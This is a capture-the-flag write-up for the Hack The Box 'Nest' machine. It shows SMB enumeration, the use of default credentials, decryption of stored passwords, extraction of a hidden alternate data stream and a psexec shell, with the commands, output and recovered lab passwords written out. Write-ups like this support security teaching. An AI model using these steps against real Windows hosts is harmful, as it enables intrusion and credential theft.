# Nest
Box IP **10.10.10.178**


### Nmap scan

```bash
$ nmap -sC -sV -T5 -v -p 1-10000 nest.htb

Services
========

host          port  proto  name          state     info
----          ----  -----  ----          -----     ----
10.10.10.178  445   tcp    microsoft-ds  open
10.10.10.178  4386  tcp    unknown       open
```

### SMB enumeration

We start by enumerating [SMB](https://github.com/lorenzoinvidia/HackTheBox-CheatSheets/wiki/Windows#SMB)

```
smb: \Shared\Templates\HR\> ls
  .                                   D        0  Wed Aug  7 21:08:01 2019
  ..                                  D        0  Wed Aug  7 21:08:01 2019
  Welcome Email.txt                   A      425  Thu Aug  8 00:55:36 2019

		10485247 blocks of size 4096. 6543323 blocks available
smb: \Shared\Templates\HR\> get "Welcome Email.txt"
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Welcome Email.txt (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
smb: \Shared\Templates\HR\>

root@parrot:~/nest# strings Welcome\ Email.txt
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>
You will find your home folder in the following location:
\\HTB-NEST\Users\<USERNAME>
If you have any issues accessing specific services or workstations, please inform the
IT department and use the credentials below until all systems have been set up for you.
Username: TempUser
Password: welcome2019
Thank you
```

We find default credential **TempUser:welcome2019**

By re-authenticating on SMB with the new credentials

we get **\IT\Configs\RU Scanner\RU_config.xml** holding **c.smith** encrypted password
```
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
```

and **\IT\Configs\NotepadPlusPlus\config.xml** with a list of files
```
<File filename="C:\windows\System32\drivers\etc\hosts" />
<File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
<File filename="C:\Users\C.Smith\Desktop\todo.txt" />
```

Even if we don't have listing permission in IT we can access its content, including a VB project to decrypt the password

We can either use an online VB.NET [compiler](https://dotnetfiddle.net/) or open the downloaded project in VS and execute the bin to obtain the decrypted password **xRxRxPANCAK3SxRxRx**

By connecting SMB with **c.smith:xRxRxPANCAK3SxRxRx** we get the user flag
```
$ smbclient \\\\10.10.10.178\\Users -U C.Smith

smb: \C.Smith\> ls
  .                                   D        0  Sun Jan 26 08:21:44 2020
  ..                                  D        0  Sun Jan 26 08:21:44 2020
  HQK Reporting                       D        0  Fri Aug  9 01:06:17 2019
  user.txt                            A       32  Fri Aug  9 01:05:24 2019

		10485247 blocks of size 4096. 6543979 blocks available
```

### Alternate Data Stream

By listing HQK Reporting directory we find out that **Debug Mode Password.txt** is an [ADS](https://github.com/lorenzoinvidia/HackTheBox-CheatSheets/wiki/Windows#alternate-data-stream) file
```
smb: \C.Smith\> cd "HQK Reporting"
smb: \C.Smith\HQK Reporting\> ls
  .                                   D        0  Fri Aug  9 01:06:17 2019
  ..                                  D        0  Fri Aug  9 01:06:17 2019
  AD Integration Module               D        0  Fri Aug  9 14:18:42 2019
  Debug Mode Password.txt             A        0  Fri Aug  9 01:08:17 2019
  HQK_Config_Backup.xml               A      249  Fri Aug  9 01:09:05 2019

		10485247 blocks of size 4096. 6543963 blocks available
```

We can switch Windows in order to get the embedded hidden file

```
C:\Users\student>net use \\10.10.10.178\Users "xRxRxPANCAK3SxRxRx" /USER:"C.Smith"
The command completed successfully.

Run
\\10.10.10.178\Users

C:\Users\student>copy "\\10.10.10.178\Users\C.Smith\HQK Reporting\Debug Mode Password.txt" Desktop
```

<p align="center">
  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/HackTheBox/b2r/Nest/src/1.png" alt="1" />
</p>

and the password **WBQ201953D8w**

<p align="center">
  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/HackTheBox/b2r/Nest/src/2.png" alt="1" />
</p>

or simply get the hidden files from SMB
```
$ smbclient \\\\10.10.10.178\\Users -U C.Smith

smb: \C.Smith\> ls
  .                                   D        0  Sun Jan 26 08:21:44 2020
  ..                                  D        0  Sun Jan 26 08:21:44 2020
  HQK Reporting                       D        0  Fri Aug  9 01:06:17 2019
  user.txt                            A       32  Fri Aug  9 01:05:24 2019

smb: \C.Smith\> cd "HQK Reporting"
smb: \C.Smith\HQK Reporting\> ls
  .                                   D        0  Fri Aug  9 01:06:17 2019
  ..                                  D        0  Fri Aug  9 01:06:17 2019
  AD Integration Module               D        0  Fri Aug  9 14:18:42 2019
  Debug Mode Password.txt             A        0  Fri Aug  9 01:08:17 2019
  HQK_Config_Backup.xml               A      249  Fri Aug  9 01:09:05 2019

		10485247 blocks of size 4096. 6543963 blocks available

smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt":Password

$ cat Debug\ Mode\ Password.txt:Password
WBQ201953D8w
```

### HQK

We switch to the HQK service on port 4386

```
$ telnet nest.htb 4386
Trying 10.10.10.178...
Connected to nest.htb.
Escape character is '^]'.

HQK Reporting Service V1.2

>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
```

By enabling debug mode we got new commands

```
>debug WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
SERVICE
SESSION
SHOWQUERY <Query_ID>
```

By moving to LDAP directory we get encrypted Administrator credentials
```
Current directory set to LDAP
>LIST

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: LDAP
>SHOWQUERY 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
```

We download and dissasseble **HqkLdap.exe** and we get decryption parameters

<p align="center">
  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/HackTheBox/b2r/Nest/src/3.png" alt="1" />
</p>

we can use the same VB.NET [compiler](https://dotnetfiddle.net/) to decrypt the password **XtH4nkS4Pl4y1nGX**


### Getting root

By loggin on SMB as **Administrator:XtH4nkS4Pl4y1nGX** we don't get any root.txt

```
root@parrot:~/nest# smbclient \\\\10.10.10.178\\Users -U Administrator
Enter WORKGROUP\Administrator's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jan 26 00:04:21 2020
  ..                                  D        0  Sun Jan 26 00:04:21 2020
  Administrator                       D        0  Fri Aug  9 17:08:23 2019
  C.Smith                             D        0  Sun Jan 26 08:21:44 2020
  L.Frost                             D        0  Thu Aug  8 19:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 19:02:50 2019
  TempUser                            D        0  Thu Aug  8 00:55:56 2019

    10485247 blocks of size 4096. 6447114 blocks available
```

We spawn a [shell](https://github.com/lorenzoinvidia/HackTheBox-CheatSheets/wiki/Windows#spawn-shell) and get root!

```
$ python psexec.py Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

  [*] Requesting shares on 10.10.10.178.....
  [*] Found writable share ADMIN$
  [*] Uploading file ldeujzwO.exe
  [*] Opening SVCManager on 10.10.10.178.....
  [*] Creating service Rlak on 10.10.10.178.....
  [*] Starting service Rlak.....
  [!] Press help for extra shell commands
  Microsoft Windows [Version 6.1.7601]
  Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

If you liked this writeup, please leave a respect on my hackthebox

![htbbadge](https://www.hackthebox.eu/badge/image/77747)
